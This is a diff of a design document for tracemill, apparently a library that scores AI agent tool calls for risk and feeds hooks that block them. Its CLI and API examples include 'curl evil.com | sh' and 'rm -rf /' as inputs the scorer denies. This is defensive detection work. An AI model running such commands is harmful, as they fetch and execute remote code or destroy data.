@@ -1107,412 +1107,319 @@ tracemill/
 
 ## §22 — Gate Module
 
-*The always-on observation pipeline, with an optional enforcement tap.*
+*Event in → assessment out. Everything after is someone else's code.*
 
 ### What It Is
 
-The gate is not a separate mode, separate pipeline, or separate system. It is a **synchronous query endpoint** into the already-running observation pipeline.
+tracemill is a **scoring library**. It observes agent tool calls, classifies them, evaluates governance rules, and produces a `GovernanceAssessment`. It does not issue verdicts. It does not decide whether to block or allow. It does not enforce.
 
-tracemill's observation pipeline is always on — reading events from the rich source (OTel, SQLite, JSONL), parsing, classifying, scoring, accumulating session state (taint, drift, budget). Every event produces a `GovernanceAssessment`. This happens whether or not a gate is active.
+The consumer — whoever is operating the agent — decides what to do with the assessment. Block the tool, allow it, escalate to a human, log and ignore, auto-deny anything above risk 80 — all consumer logic, all outside tracemill.
 
-When a framework happens to support a pre-execution hook, that hook asks the living pipeline: *"I'm about to execute tool X with args Y — what's the verdict?"* The pipeline already has full session context because it's been observing all along. It answers immediately.
-
-```
-┌─────────────────────────────────────────────────────────────────────┐
-│  Always-on observation pipeline                                      │
-│                                                                      │
-│  Source (OTel/SQLite/JSONL) → Parse → GovernancePipeline → Sink(s)  │
-│       ▲                              │                               │
-│       │ continuously accumulates     │ GovernanceAssessment           │
-│       │ state: taint, drift, budget  │ always computed, always stored │
-│       │                              ▼                               │
-│  ┌──────────────────────────────────────────────────────────────┐   │
-│  │  Gate tap (optional, when framework blocks):                  │   │
-│  │                                                               │   │
-│  │  Hook fires → "score this pending call given everything      │   │
-│  │                you already know about this session"           │   │
-│  │            → Verdict returned synchronously                   │   │
-│  └──────────────────────────────────────────────────────────────┘   │
-└─────────────────────────────────────────────────────────────────────┘
-```
-
-**One pipeline. One flow. The gate is just a synchronous read with a binary answer.**
-
-### Why This Architecture
-
-The previous design had sidecar mode as a separate stateless flow — spawn a process, score one event in isolation, exit. That creates an information gap: the sidecar has no session history, no taint state, no drift detection. It can only classify the current tool call without context.
-
-By making observation always-on and the gate a query into it:
-
-- **Full context always available** — the pipeline has been accumulating Phase 1 state (taint propagation, IFC labels, budget counters, drift windows) across every event in the session
-- **No richness gap** — the gate sees exactly what observation sees, because it IS observation
-- **No two-mode confusion** — there is one mode (always-on observation); enforcement is a side-effect of having a hook wired up
-- **Drift detection works** — "10th shell command in a row" requires history; the pipeline has it
-- **Budget tracking works** — "cost exceeded $5" requires accumulation; the pipeline has it
-
-### How the Gate Tap Works
-
-When `gate.enabled: true` in config and the framework's hook fires, the pending tool call is scored against the pipeline's current session state. The `GovernanceAssessment` is collapsed to a binary verdict:
-
-| `GovernanceAssessment` | Verdict | Rationale |
-|---------------------|---------|-----------|
-| `allow` | **allow** | No risk concern |
-| `warn` | **allow** | Risk noted but not blocking — logged for audit |
-| `escalate` | configurable | Default: **deny** (fail-closed). Override with `escalate_policy: allow` |
-| `deny` | **deny** | Risk unacceptable |
-| `transform` | **deny** | Original form blocked; agent told why and can retry with safer form |
+### The Interface
 
 ```python
-def collapse_to_verdict(assessment: GovernanceAssessment, escalate_policy: str = "deny") -> Verdict:
-    if assessment in (GovernanceAssessment.ALLOW, GovernanceAssessment.WARN):
-        return Verdict.ALLOW
-    if assessment == GovernanceAssessment.ESCALATE:
-        return Verdict.DENY if escalate_policy == "deny" else Verdict.ALLOW
-    return Verdict.DENY  # DENY, TRANSFORM
+assessment = pipeline.assess(payload)
 ```
 
-### The Single Flow (E2E)
-
-Every session follows the same flow regardless of whether a gate is active:
-
-```
-1. Agent session starts
-2. tracemill observation pipeline starts (reads from configured source)
-3. Events stream in → Parse → Phase 1/2/3 → GovernanceAssessment → Sink(s)
-   (state accumulates: taint graph, drift window, budget counter)
-4. IF framework hook fires (pre-execution):
-   a. Hook delivers pending tool call to tracemill
-   b. Pipeline scores it against current session state (same Phase 1/2/3)
-      — Phase 1 state IS updated (taint, budget, drift) even before execution
-   c. GovernanceAssessment collapsed to binary Verdict
-   d. Verdict delivered back to framework
-   e. Framework allows or blocks the tool
-5. Observation pipeline continues reading from source:
-   — Allowed events: appear in source naturally when tool executes.
-     Pipeline recognizes it (by correlation) and skips re-processing.
-     Already scored, already stored by gate path.
-   — Denied events: never appear in source (tool never executed).
-     Gate injects a synthetic "blocked" event into the observation stream
-     so it appears in audit and sinks.
-```
-
-Steps 1–3 always happen. Step 4 only happens when:
-- The framework supports a pre-execution hook, AND
-- `gate.enabled: true` in config, AND
-- The hook is wired to tracemill
-
-If any of those conditions is false, the pipeline still runs — you just get observation without enforcement.
-
-### Deduplication
-
-When the gate scores a pending event, it updates pipeline state (Phase 1) and stores the result. When that same event later appears in the static source (because the tool was allowed and executed), the observation pipeline must not re-process it:
-
-- **Gate query updates state but does NOT persist to sinks.** Persistence happens only when the observation pipeline naturally encounters the event from its source. At that point, the pipeline recognizes it was already gated (matching tool_name + args + timestamp window) and attaches the pre-computed assessment without re-running Phase 1/2/3.
-- **Denied events never appear in the source** (the tool didn't execute). The pipeline emits a synthetic `tool.blocked` event into the observation stream with the full assessment, so sinks (JSONL, SQLite, dashboard) have a complete record including blocks.
-
-This means:
-- No duplicates — each event is stored exactly once
-- Denied events are visible in audit (synthetic injection)
-- Session state is consistent — Phase 1 mutations from the gate query persist into the observation stream's state
-
-### Hook Delivery Mechanisms
-
-The hook in step 4a can be delivered two ways, depending on the framework:
-
-#### Shell hook (Copilot CLI, Claude CLI, Cline, OpenHands)
-
-The framework spawns a subprocess. tracemill connects to the running pipeline (via IPC/socket), queries it, returns the verdict as an exit code:
-
-```bash
-# The hook script — connects to the already-running observation pipeline
-tracemill gate query --session $SESSION_ID --stdin
-# Reads pending tool call from stdin
-# Queries the living pipeline for a verdict
-# Exits 0 (allow) or 2 (deny)
-```
-
-The observation pipeline MUST be running. The hook does not score in isolation — it queries the pipeline that has full session state.
-
-**Hook configuration (one-time, zero code):**
-
-For Copilot (`.github/hooks/preToolUse.json`):
-```json
-{
-  "version": 1,
-  "hooks": {
-    "preToolUse": [{
-      "type": "command",
-      "bash": "tracemill gate query --stdin",
-      "timeoutSec": 10
-    }]
-  }
-}
-```
-
-For Claude Code (`.claude/settings.json`):
-```json
-{
-  "hooks": {
-    "PreToolUse": [{
-      "type": "command",
-      "command": "tracemill gate query --stdin"
-    }]
-  }
-}
-```
-
-For Cline (`.cline/hooks/preToolUse.sh`):
-```bash
-#!/bin/bash
-tracemill gate query --stdin
-```
-
-For OpenHands (`.openhands/hooks.json`):
-```json
-{
-  "hooks": {
-    "PreToolUse": [{
-      "type": "command",
-      "command": "tracemill gate query --stdin"
-    }]
-  }
-}
-```
-
-#### In-process callback (SDK frameworks)
-
-For SDK-based frameworks, the observation pipeline runs in-process. The callback queries it directly — no subprocess, no IPC:
+That's it. tracemill's job ends here. What comes back:
 
 ```python
-from tracemill import Pipeline, Verdict
-
-# Pipeline is long-lived — observing AND available for gate queries
-pipeline = Pipeline.from_config("./tracemill.yaml", pipeline_name="copilot")
-
-# Start observation in background
-asyncio.create_task(pipeline.run())
-
-# Gate query — asks the living pipeline for a verdict
-result = pipeline.score(payload)
-result.verdict                # Verdict.ALLOW or Verdict.DENY
-result.governance_assessment  # GovernanceAssessment.DENY (raw 5-valued)
-result.meta.risk_assessment.score  # 92
-result.reason                 # "destructive_host_or_network"
-result.matched_rule           # "destructive_host_network"
+@dataclass(frozen=True, slots=True)
+class AssessmentResult:
+    governance_assessment: GovernanceAssessment  # allow/warn/escalate/deny/transform
+    risk_score: int                              # 0–100
+    reason: str | None                           # matched rule's reason code
+    matched_rule: str | None                     # rule ID that triggered
+    classification: Classification               # full classification output
+    meta: SessionMeta                            # full pipeline state (taint, drift, budget)
+    elapsed_ms: float                            # assessment latency
 ```
 
-**Copilot SDK integration:**
+The `GovernanceAssessment` enum:
 
 ```python
-from copilot import CopilotClient
-from copilot.session import PermissionRequestResult
-from tracemill import Pipeline, Verdict
-
-pipeline = Pipeline.from_config("./tracemill.yaml", pipeline_name="copilot")
-asyncio.create_task(pipeline.run())  # observation always on
-
-async def permission_handler(request, invocation):
-    result = pipeline.score({
-        "tool_name": request.tool_name or request.kind,
-        "tool_input": {"command": request.full_command_text, "path": request.file_name},
-        "kind": request.kind,
-    })
-    if result.verdict == Verdict.ALLOW:
-        return PermissionRequestResult(kind="approve-once")
-    return PermissionRequestResult(kind="reject")
-
-session = await client.create_session(
-    on_permission_request=permission_handler,
-    working_directory=cwd,
-)
-```
-
-**Claude Code SDK integration:**
-
-```python
-from claude_code_sdk import ClaudeCodeOptions, PermissionResultAllow, PermissionResultDeny
-from tracemill import Pipeline, Verdict
-
-pipeline = Pipeline.from_config("./tracemill.yaml", pipeline_name="claude")
-asyncio.create_task(pipeline.run())  # observation always on
-
-async def can_use_tool(tool_name, input_data, context):
-    result = pipeline.score({
-        "tool_name": tool_name,
-        "tool_input": input_data,
-    })
-    if result.verdict == Verdict.ALLOW:
-        return PermissionResultAllow()
-    return PermissionResultDeny(message=result.reason)
-
-options = ClaudeCodeOptions(
-    cwd=workspace_path,
-    permission_mode="default",
-    can_use_tool=can_use_tool,
-)
-```
-
-### Framework × Deployment Matrix
-
-| # | Platform | Hook type | Gate delivery | Gateable? |
-|---|----------|-----------|---------------|-----------|
-| 1 | **Copilot CLI** | Shell hook | `tracemill gate query --stdin` → exit code | ✓ |
-| 2 | **Copilot Cloud** | Shell hook | Same; `copilot-setup-steps.yml` ensures pipeline runs | ✓ |
-| 3 | **Copilot SDK** | In-process | `pipeline.score()` | ✓ |
-| 4 | **Claude Code CLI** | Shell hook | `tracemill gate query --stdin` → exit code | ✓ |
-| 5 | **Claude Code SDK** | In-process | `pipeline.score()` | ✓ |
-| 6 | **Cline** | Shell hook | `tracemill gate query --stdin` → exit code | ✓ |
-| 7 | **OpenHands** | Shell hook | `tracemill gate query --stdin` → exit code | ✓ |
-| 8 | **Goose** | In-process | `pipeline.score()` via REST approval | ✓ |
-| 9 | **OpenCode** | In-process | `pipeline.score()` via SSE | ✓ |
-| 10 | **LangGraph** | In-process | `pipeline.score()` in interrupt handler | ✓ |
-| 11 | **CrewAI** | In-process | `pipeline.score()` in `@before_tool_call` | ✓ |
-| 12 | **PydanticAI** | In-process | `pipeline.score()` via `DeferredToolRequests` | ✓ |
-| 13 | **MAF / Semantic Kernel** | In-process | `pipeline.score()` in invocation filter | ✓ |
-| 14 | **Aider** | None | — | ✗ (observation only) |
-| 15 | **smolagents** | None | — | ✗ (observation only) |
-| 16 | **SWE-agent** | None | — | ✗ (observation only) |
-
-Rows 14–16 have no pre-execution hook. Gating is not possible — tracemill observes, classifies, and scores their events for audit and reporting, but cannot block tool calls. This is a framework limitation, not a tracemill limitation.
-
-### Separation of Concerns
-
-```
-Observation pipeline (always on):
-  Source → Parser → GovernancePipeline → Sink(s)
-  - accumulates state, classifies, scores, produces GovernanceAssessment
-  - stores everything for audit regardless of gate
-
-Gate tap (optional enforcement layer):
-  collapse_to_verdict(assessment) → binary Verdict
-  - only relevant when a framework hook fires
-  - queries the observation pipeline, does not run its own
-```
-
-### Core Types
-
-```python
-# Already exists in governance/rules.py:
 class GovernanceAssessment(StrEnum):
     ALLOW = "allow"
     WARN = "warn"
     ESCALATE = "escalate"
     DENY = "deny"
     TRANSFORM = "transform"
-
-# New — gate-specific:
-class Verdict(Enum):
-    ALLOW = "allow"
-    DENY = "deny"
-
-@dataclass(frozen=True, slots=True)
-class GateResult:
-    verdict: Verdict
-    governance_assessment: GovernanceAssessment  # the raw 5-valued output
-    reason: str | None           # reason_code from matched rule
-    matched_rule: str | None     # rule ID that triggered
-    meta: SessionMeta            # full governance pipeline output
-    elapsed_ms: float            # scoring latency
 ```
 
-### Gate Configuration (in `tracemill.yaml`)
+These are **recommendations from the rules engine**, not verdicts. The consumer interprets them however they want.
+
+### Two Interaction Models
+
+#### Push: observation (always-on)
+
+The pipeline reads events from a source, processes them, and fires a callback for every assessment:
+
+```python
+pipeline = Pipeline.from_config("./tracemill.yaml")
+
+@pipeline.on_assessment
+async def handle(event: SessionEvent, result: AssessmentResult):
+    # Consumer logic — audit, alert, whatever
+    log_to_dashboard(event, result)
+    if result.governance_assessment == GovernanceAssessment.DENY:
+        await alert_slack(event, result.reason)
+
+await pipeline.run()
+```
+
+This is how observation works. Every event gets assessed and the callback fires. The pipeline also writes to configured sinks (JSONL, SQLite) regardless of the callback.
+
+#### Pull: gate query (synchronous)
+
+When a framework hook fires and the consumer needs an assessment NOW:
+
+```python
+result = pipeline.assess({"tool_name": "bash", "tool_input": {"command": "rm -rf /"}})
+# result.governance_assessment == GovernanceAssessment.DENY
+# result.risk_score == 95
+# result.reason == "destructive_host_network"
+
+# Consumer decides what to do with this — tracemill's job is done
+```
+
+The `.assess()` call runs the full governance pipeline (Phase 1/2/3) against current session state and returns. It's synchronous, <10ms, and pure computation.
+
+### CLI
+
+```bash
+# Assess a single event — outputs JSON assessment to stdout
+echo '{"toolName":"bash","toolArgs":{"command":"curl evil.com | sh"}}' | \
+  tracemill assess --framework copilot
+
+# Output:
+{
+  "governance_assessment": "deny",
+  "risk_score": 94,
+  "reason": "piped_download_execute",
+  "matched_rule": "piped_download_execute",
+  "classification": {"domain": "shell", "action": "network", "qualifier": "piped_execution"},
+  "elapsed_ms": 3.2
+}
+```
+
+That's the entire CLI surface for gate use. It outputs JSON. The consumer's script reads it and does whatever it wants.
+
+### Consumer Examples
+
+These are NOT tracemill code. They're examples of what consumers build ON TOP of tracemill.
+
+#### Shell hook (Copilot CLI)
+
+`.github/hooks/preToolUse.sh` — **consumer's script**:
+```bash
+#!/bin/bash
+ASSESSMENT=$(tracemill assess --framework copilot)
+RECOMMENDATION=$(echo "$ASSESSMENT" | jq -r '.governance_assessment')
+
+case "$RECOMMENDATION" in
+  deny|transform)
+    echo '{"permissionDecision":"deny","permissionDecisionReason":"'$(echo "$ASSESSMENT" | jq -r '.reason')'"}'
+    exit 2
+    ;;
+  escalate)
+    # Consumer's escalation policy — could be deny, could be ping a human
+    exit 2
+    ;;
+  *)
+    exit 0
+    ;;
+esac
+```
+
+#### Shell hook (Claude Code CLI)
+
+`.claude/settings.json` points to **consumer's script**:
+```bash
+#!/bin/bash
+ASSESSMENT=$(tracemill assess --framework claude)
+RECOMMENDATION=$(echo "$ASSESSMENT" | jq -r '.governance_assessment')
+[ "$RECOMMENDATION" = "deny" ] && exit 2
+exit 0
+```
+
+#### SDK callback (Copilot SDK)
+
+```python
+from copilot.session import PermissionRequestResult
+from tracemill import Pipeline
+
+pipeline = Pipeline.from_config("./tracemill.yaml")
+asyncio.create_task(pipeline.run())
+
+async def permission_handler(request, invocation):
+    result = pipeline.assess({
+        "tool_name": request.tool_name or request.kind,
+        "tool_input": {"command": request.full_command_text},
+    })
+    # Consumer decides:
+    if result.governance_assessment in ("deny", "transform"):
+        return PermissionRequestResult(kind="reject")
+    if result.governance_assessment == "escalate":
+        # Consumer's escalation — maybe block, maybe ask a human
+        decision = await ask_team_lead(result)
+        return decision
+    return PermissionRequestResult(kind="approve-once")
+```
+
+#### SDK callback (Claude Code SDK)
+
+```python
+from claude_code_sdk import PermissionResultAllow, PermissionResultDeny
+from tracemill import Pipeline
+
+pipeline = Pipeline.from_config("./tracemill.yaml")
+asyncio.create_task(pipeline.run())
+
+async def can_use_tool(tool_name, input_data, context):
+    result = pipeline.assess({"tool_name": tool_name, "tool_input": input_data})
+    # Consumer decides:
+    if result.governance_assessment in ("deny", "escalate", "transform"):
+        return PermissionResultDeny(message=result.reason)
+    return PermissionResultAllow()
+```
+
+### What tracemill Owns vs What the Consumer Owns
+
+| tracemill | Consumer |
+|-----------|----------|
+| Observation pipeline (always-on) | Hook scripts |
+| Event parsing (framework mappings) | Enforcement logic (block/allow) |
+| Classification + risk scoring | Escalation flow (human-in-the-loop) |
+| Rule evaluation → `GovernanceAssessment` | Timeout handling |
+| Session state (taint, drift, budget) | Exit code mapping |
+| Storage (sinks: JSONL, SQLite) | Notification channels (Slack, email) |
+| `.assess()` API | What to do with the assessment |
+
+### The Single Flow
+
+```
+1. Agent session starts
+2. tracemill observation pipeline starts (reads from configured source)
+3. Events stream in → Parse → Phase 1/2/3 → GovernanceAssessment
+   • State accumulates (taint, drift, budget)
+   • on_assessment callback fires (if registered)
+   • Sinks persist (always)
+4. IF consumer's hook fires (pre-execution):
+   a. Consumer's hook script/callback calls tracemill assess
+   b. Pipeline runs Phase 1/2/3 against current session state
+   c. Returns AssessmentResult to consumer
+   d. Consumer decides allow/deny/escalate (their code, their logic)
+   e. Consumer returns decision to framework
+5. Observation pipeline continues:
+   • Allowed events: appear in source, pipeline recognizes (dedup), skips re-processing
+   • Denied events: never in source, pipeline emits synthetic tool.blocked event
+```
+
+### Deduplication
+
+The `.assess()` call updates pipeline state (Phase 1: taint, budget, drift) but does NOT persist to sinks. Persistence happens only when the observation pipeline encounters the event from its source:
+
+- **Allowed events:** Observation sees them naturally, recognizes pre-assessed (by correlation), attaches pre-computed assessment, persists once.
+- **Denied events:** Never appear in source. Pipeline emits a synthetic `tool.blocked` event into the stream so sinks have a complete audit record.
+
+### Configuration (`tracemill.yaml`)
+
+tracemill's config covers observation only. No enforcement config, no verdict mapping, no escalation policy:
 
 ```yaml
-# tracemill.yaml
 pipelines:
   copilot:
     source:
       type: sqlite
       path: ~/.config/github-copilot/chat.db
     framework: copilot
-    gate:
-      enabled: true
-      escalate_policy: deny       # what to do on GovernanceAssessment.ESCALATE
-      # Rules come from governance_rules.yaml (same rules always)
-      # Override per-pipeline if needed:
-      # rules_path: ./custom-rules.yaml
     sinks:
       - type: jsonl
         path: ./traces/copilot.jsonl
 ```
 
-No `gate:` key (or `gate.enabled: false`) = observation-only. The pipeline still runs, still scores, still stores. Nobody blocks on the output.
+Rules live in `governance_rules.yaml`. They produce assessments, not enforcement decisions.
 
 ### Pipeline API
 
 ```python
 class Pipeline:
-    """Unified pipeline: always-on observation + optional gate queries."""
+    """Observation + assessment. No enforcement."""
 
     @classmethod
     def from_config(cls, config_path: Path, pipeline_name: str) -> "Pipeline":
         """Load pipeline from tracemill.yaml."""
         ...
 
-    def score(self, payload: dict) -> GateResult:
-        """Synchronous gate query against the running pipeline's session state.
+    def assess(self, payload: dict) -> AssessmentResult:
+        """Synchronous assessment against current session state.
 
-        1. Parser normalizes payload → SessionEvent
-        2. GovernancePipeline.process_event() with current session state
-        3. GovernanceAssessment collapsed to Verdict
-        4. Returns GateResult
+        Runs Parse → Phase 1/2/3 → returns AssessmentResult.
+        Updates session state (taint, budget, drift).
+        Does NOT persist to sinks.
         """
         ...
 
-    async def run(self) -> None:
-        """Start the always-on observation loop (reads source, processes, sinks)."""
+    def on_assessment(self, callback: Callable) -> None:
+        """Register callback for observation assessments (push model)."""
         ...
-```
 
-### CLI Interface
-
-```bash
-# Start the observation pipeline (always-on, runs as daemon/service)
-tracemill run --config tracemill.yaml
-
-# Gate query — used by shell hooks; connects to running pipeline
-tracemill gate query --stdin
-# Reads pending tool call from stdin
-# Queries the running observation pipeline
-# Exits 0 (allow) or 2 (deny)
-
-# Debugging: dry-run score without a running pipeline
-echo '{"toolName":"bash","toolArgs":{"command":"rm -rf /"}}' | \
-  tracemill gate dry-run --framework copilot
-# Output: {"verdict":"deny","assessment":"deny","score":92,"rule":"destructive_host_network"}
+    async def run(self) -> None:
+        """Start always-on observation loop."""
+        ...
 ```
 
 ### Design Constraints
 
-1. **Observation is always on** — the pipeline runs continuously, accumulating state. The gate queries it; it never runs independently.
-2. **Full context always** — every gate query has access to complete session history (taint, drift, budget) because the pipeline has been observing all along.
-3. **No new rule engine** — gate uses `governance/rules.py` and `governance_rules.yaml` directly.
-4. **No framework dependencies** — `gate/` never imports Claude Code, Copilot, LangGraph, etc.
-5. **No network calls from scoring** — `.score()` is pure computation against accumulated state.
-6. **Deterministic** — same state + same payload + same rules = same verdict.
-7. **Fast** — target <10ms p99 for `.score()`.
-8. **Assessment is data** — `governance_rules.yaml`. YAML only. Turing-incomplete by design.
-9. **Binary enforcement** — governance produces 5-valued `GovernanceAssessment`; gate collapses to binary.
-10. **Fail-closed** — if `tracemill gate query` can't reach the running pipeline, exit non-zero = deny.
+1. **tracemill never decides** — it assesses. The consumer decides enforcement.
+2. **No Verdict type** — tracemill has no concept of allow/deny as a binary decision.
+3. **No enforcement config** — no `gate.enabled`, no `escalate_policy`, no exit code mapping.
+4. **Assessment is always computed** — whether or not anyone calls `.assess()`, observation produces assessments for every event.
+5. **`.assess()` is synchronous** — <10ms p99, pure computation against accumulated state.
+6. **Session state is shared** — `.assess()` and observation share the same state (taint, drift, budget). Gate queries see full history.
+7. **No framework dependencies** — tracemill never imports Copilot, Claude, LangGraph, etc.
+8. **Rules are data** — `governance_rules.yaml`. Turing-incomplete.
+9. **Callbacks are optional** — `on_assessment` is for consumers who want push. Sinks persist regardless.
+
+### Framework Compatibility
+
+| # | Platform | Hook type | Consumer calls | Gateable? |
+|---|----------|-----------|----------------|-----------|
+| 1 | **Copilot CLI** | Shell script | `tracemill assess --framework copilot` | ✓ |
+| 2 | **Copilot Cloud** | Shell script | Same | ✓ |
+| 3 | **Copilot SDK** | In-process | `pipeline.assess(payload)` | ✓ |
+| 4 | **Claude Code CLI** | Shell script | `tracemill assess --framework claude` | ✓ |
+| 5 | **Claude Code SDK** | In-process | `pipeline.assess(payload)` | ✓ |
+| 6 | **Cline** | Shell script | `tracemill assess --framework cline` | ✓ |
+| 7 | **OpenHands** | Shell script | `tracemill assess --framework openhands` | ✓ |
+| 8 | **Goose** | In-process | `pipeline.assess(payload)` | ✓ |
+| 9 | **OpenCode** | In-process | `pipeline.assess(payload)` | ✓ |
+| 10 | **LangGraph** | In-process | `pipeline.assess(payload)` | ✓ |
+| 11 | **CrewAI** | In-process | `pipeline.assess(payload)` | ✓ |
+| 12 | **PydanticAI** | In-process | `pipeline.assess(payload)` | ✓ |
+| 13 | **MAF / Semantic Kernel** | In-process | `pipeline.assess(payload)` | ✓ |
+| 14 | **Aider** | None | — | ✗ (observation only) |
+| 15 | **smolagents** | None | — | ✗ (observation only) |
+| 16 | **SWE-agent** | None | — | ✗ (observation only) |
+
+Rows 14–16 have no pre-execution hook. tracemill observes and assesses their events, but no consumer can block tool calls.
 
 ### File Structure
 
 ```
 src/tracemill/
-├── governance/              # EXISTING — the engine (unchanged)
+├── governance/              # The engine (classification + rules + state)
 │   ├── pipeline.py          # GovernancePipeline (Phase 1/2/3)
 │   ├── rules.py             # Rule, Predicate, evaluate_rules()
 │   ├── labeler.py           # GovernanceLabeler
 │   ├── state.py             # SessionState (taint, budget, drift)
-│   └── ...                  # IFC, PII, MCP drift, etc.
-├── gate/                    # NEW — thin enforcement layer
-│   ├── __init__.py          # Public API: GateResult, Verdict, collapse_to_verdict
-│   ├── types.py             # Verdict enum, GateResult dataclass
-│   ├── collapse.py          # GovernanceAssessment → Verdict (5 lines)
-│   └── ipc.py               # IPC client for shell hooks to query running pipeline
-├── classify/                # shared — classification engine
-├── pipeline/                # sources, sinks, orchestration
-└── mappings/                # framework YAML definitions
+│   └── ...
+├── assess/                  # Public assessment interface
+│   ├── __init__.py          # AssessmentResult, GovernanceAssessment
+│   └── types.py             # Dataclasses
+├── classify/                # Classification engine
+├── pipeline/                # Sources, sinks, orchestration
+└── mappings/                # Framework YAML definitions
 ```
 
 ---
